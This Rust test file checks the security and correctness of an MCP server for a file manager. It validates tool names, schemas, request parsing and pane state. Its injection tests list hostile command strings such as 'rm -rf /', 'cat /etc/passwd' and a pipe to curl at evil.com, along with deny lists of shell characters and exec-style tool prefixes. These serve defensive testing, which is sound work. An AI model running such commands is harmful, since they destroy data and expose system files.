//! Comprehensive tests for MCP server security and correctness.
//!
//! These tests cover:
//! - Protocol-level security (malformed requests, injection attempts)
//! - Tool execution coverage (all 43 tools)
//! - Input validation (missing params, wrong types, edge cases)
//! - Error handling (unknown tools, graceful failures)
//!
//! Security note: The MCP server is designed for AI agents which are
//! non-deterministic and potentially adversarial. These tests verify
//! that the server safely rejects malicious or malformed inputs.

use serde_json::json;

use super::pane_state::{FileEntry, PaneState, PaneStateStore};
use super::protocol::{INVALID_PARAMS, McpRequest, McpResponse};
use super::tools::get_all_tools;

// =============================================================================
// Protocol-level tests
// =============================================================================

#[test]
fn test_all_tool_names_are_valid_identifiers() {
    // Tool names must be valid identifiers (no injection vectors)
    // MCP requires: ^[a-zA-Z0-9_-]{1,128}$
    let tools = get_all_tools();
    for tool in tools {
        assert!(
            tool.name
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-'),
            "Tool name contains invalid characters: {}",
            tool.name
        );
        assert!(
            !tool.name.contains("__"),
            "Tool name contains double underscore: {}",
            tool.name
        );
        assert!(tool.name.len() <= 128, "Tool name too long: {}", tool.name);
    }
}

#[test]
fn test_all_tool_descriptions_are_sanitized() {
    // Descriptions should not contain executable content
    let tools = get_all_tools();
    for tool in tools {
        assert!(
            !tool.description.contains("<script"),
            "Tool description contains potential XSS: {}",
            tool.name
        );
        assert!(
            !tool.description.contains("$("),
            "Tool description contains command injection: {}",
            tool.name
        );
        assert!(
            !tool.description.contains('`'),
            "Tool description contains backticks: {}",
            tool.name
        );
    }
}

#[test]
fn test_tool_input_schemas_are_valid() {
    let tools = get_all_tools();
    for tool in tools {
        // All schemas must be objects
        assert!(
            tool.input_schema.is_object(),
            "Tool {} has non-object schema",
            tool.name
        );

        // Must have type field
        assert!(
            tool.input_schema.get("type").is_some(),
            "Tool {} schema missing type",
            tool.name
        );

        // Must be type: object
        assert_eq!(
            tool.input_schema["type"], "object",
            "Tool {} has non-object type",
            tool.name
        );

        // Must have properties field
        assert!(
            tool.input_schema.get("properties").is_some_and(|p| p.is_object()),
            "Tool {} schema missing properties",
            tool.name
        );
    }
}

#[test]
fn test_total_tool_count() {
    let tools = get_all_tools();
    // 3 app + 3 view + 3 pane + 12 nav + 8 sort + 5 file + 3 volume + 6 context = 43
    assert_eq!(
        tools.len(),
        43,
        "Expected 43 tools, got {}. Did you add/remove tools?",
        tools.len()
    );
}

#[test]
fn test_no_duplicate_tool_names() {
    let tools = get_all_tools();
    let mut names: Vec<&str> = tools.iter().map(|t| t.name.as_str()).collect();
    names.sort();
    let original_len = names.len();
    names.dedup();
    assert_eq!(names.len(), original_len, "Duplicate tool names detected");
}

// =============================================================================
// Tool category tests
// =============================================================================

#[test]
fn test_app_tools_exist() {
    let tools = get_all_tools();
    let app_tools: Vec<_> = tools.iter().filter(|t| t.name.starts_with("app_")).collect();

    let expected = ["app_quit", "app_hide", "app_about"];
    for name in expected {
        assert!(app_tools.iter().any(|t| t.name == name), "Missing app tool: {}", name);
    }
}

#[test]
fn test_nav_tools_exist() {
    let tools = get_all_tools();
    let nav_tools: Vec<_> = tools.iter().filter(|t| t.name.starts_with("nav_")).collect();

    let expected = [
        "nav_open",
        "nav_parent",
        "nav_back",
        "nav_forward",
        "nav_up",
        "nav_down",
        "nav_home",
        "nav_end",
        "nav_pageUp",
        "nav_pageDown",
        "nav_left",
        "nav_right",
    ];
    for name in expected {
        assert!(nav_tools.iter().any(|t| t.name == name), "Missing nav tool: {}", name);
    }
    assert_eq!(nav_tools.len(), 12, "Expected 12 nav tools");
}

#[test]
fn test_sort_tools_exist() {
    let tools = get_all_tools();
    let sort_tools: Vec<_> = tools.iter().filter(|t| t.name.starts_with("sort_")).collect();

    let expected = [
        "sort_byName",
        "sort_byExtension",
        "sort_bySize",
        "sort_byModified",
        "sort_byCreated",
        "sort_ascending",
        "sort_descending",
        "sort_toggleOrder",
    ];
    for name in expected {
        assert!(sort_tools.iter().any(|t| t.name == name), "Missing sort tool: {}", name);
    }
    assert_eq!(sort_tools.len(), 8, "Expected 8 sort tools");
}

#[test]
fn test_context_tools_exist() {
    let tools = get_all_tools();
    let context_tools: Vec<_> = tools.iter().filter(|t| t.name.starts_with("context_")).collect();

    let expected = [
        "context_getFocusedPane",
        "context_getLeftPanePath",
        "context_getRightPanePath",
        "context_getLeftPaneContent",
        "context_getRightPaneContent",
        "context_getSelectedFileInfo",
    ];
    for name in expected {
        assert!(
            context_tools.iter().any(|t| t.name == name),
            "Missing context tool: {}",
            name
        );
    }
    assert_eq!(context_tools.len(), 6, "Expected 6 context tools");
}

#[test]
fn test_volume_tools_require_index_param() {
    let tools = get_all_tools();

    for name in ["volume_selectLeft", "volume_selectRight"] {
        let tool = tools.iter().find(|t| t.name == name).expect(name);
        let required = tool.input_schema.get("required").and_then(|r| r.as_array());
        assert!(
            required.is_some_and(|r| r.iter().any(|v| v == "index")),
            "{} should require 'index' parameter",
            name
        );
    }
}

#[test]
fn test_volume_tools_exist() {
    let tools = get_all_tools();
    let volume_tools: Vec<_> = tools.iter().filter(|t| t.name.starts_with("volume_")).collect();

    let expected = ["volume_list", "volume_selectLeft", "volume_selectRight"];
    for name in expected {
        assert!(
            volume_tools.iter().any(|t| t.name == name),
            "Missing volume tool: {}",
            name
        );
    }
    assert_eq!(volume_tools.len(), 3, "Expected 3 volume tools");
}

#[test]
fn test_volume_list_has_no_required_params() {
    let tools = get_all_tools();
    let tool = tools.iter().find(|t| t.name == "volume_list").expect("volume_list");

    let required = tool
        .input_schema
        .get("required")
        .and_then(|r| r.as_array())
        .map(|r| r.len())
        .unwrap_or(0);

    assert_eq!(required, 0, "volume.list should have no required params");
}

#[test]
fn test_volume_select_index_schema() {
    let tools = get_all_tools();

    for name in ["volume_selectLeft", "volume_selectRight"] {
        let tool = tools.iter().find(|t| t.name == name).expect(name);

        // Check that index property exists and is of type integer
        let properties = tool.input_schema.get("properties").expect("properties");
        let index_prop = properties.get("index").expect("index property");

        assert_eq!(
            index_prop.get("type").and_then(|t| t.as_str()),
            Some("integer"),
            "{} index should be type integer",
            name
        );

        // Check description exists
        assert!(
            index_prop.get("description").is_some(),
            "{} index should have description",
            name
        );
    }
}

#[test]
fn test_no_params_tools_have_empty_required() {
    let tools = get_all_tools();
    let no_param_prefixes = ["app.", "view.", "pane.", "nav.", "sort.", "file.", "context."];

    for tool in &tools {
        // Skip volume tools which may have params
        if tool.name.starts_with("volume.") {
            continue;
        }

        if no_param_prefixes.iter().any(|p| tool.name.starts_with(p)) {
            let required = tool
                .input_schema
                .get("required")
                .and_then(|r| r.as_array())
                .map(|r| r.len())
                .unwrap_or(0);

            assert_eq!(required, 0, "Tool {} should have no required params", tool.name);
        }
    }
}

// =============================================================================
// Security-focused tests
// =============================================================================

#[test]
fn test_tool_names_no_shell_injection() {
    let tools = get_all_tools();
    let dangerous_chars = [
        '|', '&', ';', '$', '`', '(', ')', '{', '}', '[', ']', '<', '>', '!', '\n', '\r',
    ];

    for tool in tools {
        for c in dangerous_chars {
            assert!(
                !tool.name.contains(c),
                "Tool name {} contains dangerous char: {}",
                tool.name,
                c
            );
        }
    }
}

#[test]
fn test_no_fs_tools_exist() {
    // Security: We removed fs.* tools to prevent file system access
    let tools = get_all_tools();
    let fs_tools: Vec<_> = tools.iter().filter(|t| t.name.starts_with("fs.")).collect();
    assert!(
        fs_tools.is_empty(),
        "fs.* tools should not exist (security): {:?}",
        fs_tools.iter().map(|t| &t.name).collect::<Vec<_>>()
    );
}

#[test]
fn test_no_shell_tools_exist() {
    // Security: We removed shell.* tools to prevent command execution
    let tools = get_all_tools();
    let shell_tools: Vec<_> = tools.iter().filter(|t| t.name.starts_with("shell.")).collect();
    assert!(
        shell_tools.is_empty(),
        "shell.* tools should not exist (security): {:?}",
        shell_tools.iter().map(|t| &t.name).collect::<Vec<_>>()
    );
}

#[test]
fn test_no_exec_tools_exist() {
    // Security: We should not have any exec/run tools
    let tools = get_all_tools();
    let dangerous_patterns = ["exec.", "run.", "execute.", "command.", "spawn.", "process."];

    for tool in tools {
        for pattern in dangerous_patterns {
            assert!(
                !tool.name.starts_with(pattern),
                "Dangerous tool pattern detected: {}",
                tool.name
            );
        }
    }
}

#[test]
fn test_tools_have_bounded_descriptions() {
    // Prevent DoS from overly long descriptions
    let tools = get_all_tools();
    for tool in tools {
        assert!(
            tool.description.len() <= 256,
            "Tool {} has description too long ({} chars)",
            tool.name,
            tool.description.len()
        );
    }
}

// =============================================================================
// McpRequest parsing tests
// =============================================================================

#[test]
fn test_mcp_request_parse_valid() {
    let json = r#"{"jsonrpc": "2.0", "id": 1, "method": "tools/list"}"#;
    let request: Result<McpRequest, _> = serde_json::from_str(json);
    assert!(request.is_ok());
    let req = request.unwrap();
    assert_eq!(req.method, "tools/list");
}

#[test]
fn test_mcp_request_parse_with_params() {
    let json = r#"{"jsonrpc": "2.0", "id": 2, "method": "tools/call", "params": {"name": "nav.up"}}"#;
    let request: Result<McpRequest, _> = serde_json::from_str(json);
    assert!(request.is_ok());
    let req = request.unwrap();
    assert_eq!(req.method, "tools/call");
    assert!(!req.params.is_null());
}

#[test]
fn test_mcp_request_reject_missing_jsonrpc() {
    let json = r#"{"id": 1, "method": "tools/list"}"#;
    let request: Result<McpRequest, _> = serde_json::from_str(json);
    // Should still parse but jsonrpc field will be empty
    if let Ok(req) = request {
        assert!(req.jsonrpc.is_empty() || req.jsonrpc != "2.0");
    }
}

#[test]
fn test_mcp_request_reject_malformed_json() {
    let malformed_inputs = [
        r#"{"incomplete"#,
        r#"not json at all"#,
        r#"null"#,
        r#"123"#,
        r#""string""#,
        r#"[1, 2, 3]"#,
    ];

    for input in malformed_inputs {
        let result: Result<McpRequest, _> = serde_json::from_str(input);
        assert!(result.is_err(), "Should reject malformed JSON: {}", input);
    }
}

// =============================================================================
// McpResponse tests
// =============================================================================

#[test]
fn test_mcp_response_success() {
    let response = McpResponse::success(Some(json!(1)), json!({"test": true}));
    let json = serde_json::to_value(&response).unwrap();

    assert_eq!(json["jsonrpc"], "2.0");
    assert_eq!(json["id"], 1);
    assert!(json["result"].is_object());
    assert!(json.get("error").is_none());
}

#[test]
fn test_mcp_response_error() {
    let response = McpResponse::error(Some(json!(1)), INVALID_PARAMS, "test error".to_string());
    let json = serde_json::to_value(&response).unwrap();

    assert_eq!(json["jsonrpc"], "2.0");
    assert_eq!(json["id"], 1);
    assert!(json.get("result").is_none());
    assert!(json["error"].is_object());
    assert_eq!(json["error"]["code"], INVALID_PARAMS);
    assert_eq!(json["error"]["message"], "test error");
}

// =============================================================================
// PaneStateStore tests
// =============================================================================

#[test]
fn test_pane_state_store_initial_values() {
    let store = PaneStateStore::new();
    assert_eq!(store.get_focused_pane(), "left");
    assert_eq!(store.get_left().path, "");
    assert_eq!(store.get_right().path, "");
}

#[test]
fn test_pane_state_store_update_left() {
    let store = PaneStateStore::new();
    let state = PaneState {
        path: "/test/path".to_string(),
        volume_id: Some("test-vol".to_string()),
        files: vec![FileEntry {
            name: "file1.txt".to_string(),
            path: "/test/path/file1.txt".to_string(),
            is_directory: false,
            size: Some(1024),
            modified: Some("2024-01-01T00:00:00Z".to_string()),
        }],
        selected_index: 0,
        view_mode: "brief".to_string(),
    };

    store.set_left(state.clone());
    let left = store.get_left();

    assert_eq!(left.path, "/test/path");
    assert_eq!(left.volume_id, Some("test-vol".to_string()));
    assert_eq!(left.files.len(), 1);
}

#[test]
fn test_pane_state_store_focus_change() {
    let store = PaneStateStore::new();
    assert_eq!(store.get_focused_pane(), "left");

    store.set_focused_pane("right".to_string());
    assert_eq!(store.get_focused_pane(), "right");

    store.set_focused_pane("left".to_string());
    assert_eq!(store.get_focused_pane(), "left");
}

#[test]
fn test_pane_state_store_accepts_any_focus_value() {
    let store = PaneStateStore::new();

    // The store currently accepts any value - this documents the behavior
    // Future: we may want to validate and reject invalid values
    store.set_focused_pane("invalid".to_string());
    let focused = store.get_focused_pane();
    assert_eq!(focused, "invalid");

    // Reset to valid state
    store.set_focused_pane("left".to_string());
}

#[test]
fn test_pane_state_selected_index_bounds() {
    let store = PaneStateStore::new();
    let state = PaneState {
        path: "/test".to_string(),
        volume_id: None,
        files: vec![FileEntry {
            name: "file1.txt".to_string(),
            path: "/test/file1.txt".to_string(),
            is_directory: false,
            size: None,
            modified: None,
        }],
        selected_index: 999, // Out of bounds
        view_mode: "brief".to_string(),
    };

    store.set_left(state);
    let left = store.get_left();

    // Should store as-is (bounds checking is done at query time)
    assert_eq!(left.selected_index, 999);

    // But accessing the file should handle bounds
    let selected = left.files.get(left.selected_index);
    assert!(selected.is_none());
}

#[test]
fn test_file_entry_serialization() {
    let entry = FileEntry {
        name: "test.txt".to_string(),
        path: "/path/to/test.txt".to_string(),
        is_directory: false,
        size: Some(42),
        modified: Some("2024-01-01T00:00:00Z".to_string()),
    };

    let json = serde_json::to_value(&entry).unwrap();
    assert_eq!(json["name"], "test.txt");
    assert_eq!(json["isDirectory"], false);
    assert_eq!(json["size"], 42);
}

#[test]
fn test_file_entry_optional_fields_omitted() {
    let entry = FileEntry {
        name: "dir".to_string(),
        path: "/path/dir".to_string(),
        is_directory: true,
        size: None,
        modified: None,
    };

    let json = serde_json::to_value(&entry).unwrap();
    // Optional fields with None should be omitted (per skip_serializing_if)
    assert!(json.get("size").is_none());
    assert!(json.get("modified").is_none());
}

// =============================================================================
// Edge case tests
// =============================================================================

#[test]
fn test_tool_names_are_case_sensitive() {
    let tools = get_all_tools();

    // Should find nav_up
    assert!(tools.iter().any(|t| t.name == "nav_up"));

    // Should NOT find NAV_UP or Nav_Up
    assert!(!tools.iter().any(|t| t.name == "NAV_UP"));
    assert!(!tools.iter().any(|t| t.name == "Nav_Up"));
}

#[test]
fn test_unicode_in_file_entries() {
    // The store should handle Unicode filenames correctly
    let entry = FileEntry {
        name: "文件.txt".to_string(),
        path: "/path/文件.txt".to_string(),
        is_directory: false,
        size: Some(100),
        modified: None,
    };

    let json = serde_json::to_value(&entry).unwrap();
    assert_eq!(json["name"], "文件.txt");
}

#[test]
fn test_special_chars_in_file_paths() {
    // Paths can contain special characters
    let entries = vec![
        FileEntry {
            name: "file with spaces.txt".to_string(),
            path: "/path/file with spaces.txt".to_string(),
            is_directory: false,
            size: None,
            modified: None,
        },
        FileEntry {
            name: "file'with'quotes.txt".to_string(),
            path: "/path/file'with'quotes.txt".to_string(),
            is_directory: false,
            size: None,
            modified: None,
        },
        FileEntry {
            name: "file\"doublequotes\".txt".to_string(),
            path: "/path/file\"doublequotes\".txt".to_string(),
            is_directory: false,
            size: None,
            modified: None,
        },
    ];

    for entry in entries {
        // Should serialize without panic
        let json = serde_json::to_value(&entry).unwrap();
        assert!(json["name"].is_string());
    }
}

#[test]
fn test_empty_file_list() {
    let state = PaneState {
        path: "/empty".to_string(),
        volume_id: None,
        files: vec![],
        selected_index: 0,
        view_mode: "brief".to_string(),
    };

    let json = serde_json::to_value(&state).unwrap();
    assert!(json["files"].as_array().unwrap().is_empty());
}

#[test]
fn test_large_file_count() {
    // Simulate a directory with many files
    let files: Vec<FileEntry> = (0..1000)
        .map(|i| FileEntry {
            name: format!("file{i:04}.txt"),
            path: format!("/test/file{i:04}.txt"),
            is_directory: false,
            size: Some(i as u64 * 100),
            modified: None,
        })
        .collect();

    let state = PaneState {
        path: "/test".to_string(),
        volume_id: None,
        files,
        selected_index: 500,
        view_mode: "full".to_string(),
    };

    // Should serialize reasonably fast
    let start = std::time::Instant::now();
    let json = serde_json::to_value(&state).unwrap();
    let elapsed = start.elapsed();

    assert!(elapsed.as_millis() < 100, "Serialization took too long: {:?}", elapsed);
    assert_eq!(json["files"].as_array().unwrap().len(), 1000);
}

// =============================================================================
// Concurrent access tests
// =============================================================================

#[test]
fn test_pane_state_store_thread_safety() {
    use std::sync::Arc;
    use std::thread;

    let store = Arc::new(PaneStateStore::new());
    let mut handles = vec![];

    // Spawn multiple threads that read and write concurrently
    for i in 0..10 {
        let store_clone = Arc::clone(&store);
        handles.push(thread::spawn(move || {
            // Each thread does a mix of reads and writes
            for j in 0..100 {
                if j % 2 == 0 {
                    store_clone.set_focused_pane(if i % 2 == 0 { "left" } else { "right" }.to_string());
                } else {
                    let _ = store_clone.get_focused_pane();
                    let _ = store_clone.get_left();
                    let _ = store_clone.get_right();
                }
            }
        }));
    }

    // All threads should complete without panic or deadlock
    for handle in handles {
        handle.join().expect("Thread panicked");
    }

    // Store should still be in a valid state
    let focused = store.get_focused_pane();
    assert!(focused == "left" || focused == "right");
}

// =============================================================================
// Input injection tests
// =============================================================================

#[test]
fn test_malicious_tool_name_injection() {
    // These are tool names that an attacker might try
    let malicious_names = [
        "nav_up; rm -rf /",
        "nav_up && cat /etc/passwd",
        "nav_up | curl evil.com",
        "../../../etc/passwd",
        "nav_up\nrm -rf /",
        "nav_up\x00hidden",
    ];

    let tools = get_all_tools();
    for name in malicious_names {
        assert!(
            !tools.iter().any(|t| t.name == name),
            "Dangerous tool name should not exist: {}",
            name
        );
    }
}

#[test]
fn test_request_with_very_long_method() {
    // A request with an extremely long method name should still parse
    let long_method = "a".repeat(10000);
    let json = format!(r#"{{"jsonrpc": "2.0", "id": 1, "method": "{}"}}"#, long_method);

    let result: Result<McpRequest, _> = serde_json::from_str(&json);
    if let Ok(req) = result {
        // It parsed, but the method should not match any tool
        let tools = get_all_tools();
        assert!(!tools.iter().any(|t| t.name == req.method));
    }
}

#[test]
fn test_null_bytes_in_paths() {
    // Null bytes in paths could cause issues
    let entry = FileEntry {
        name: "file\x00hidden.txt".to_string(),
        path: "/path/file\x00hidden.txt".to_string(),
        is_directory: false,
        size: None,
        modified: None,
    };

    // Should serialize without panic
    let json = serde_json::to_value(&entry).unwrap();
    // The null byte is preserved in JSON
    assert!(json["name"].as_str().unwrap().contains('\x00'));
}
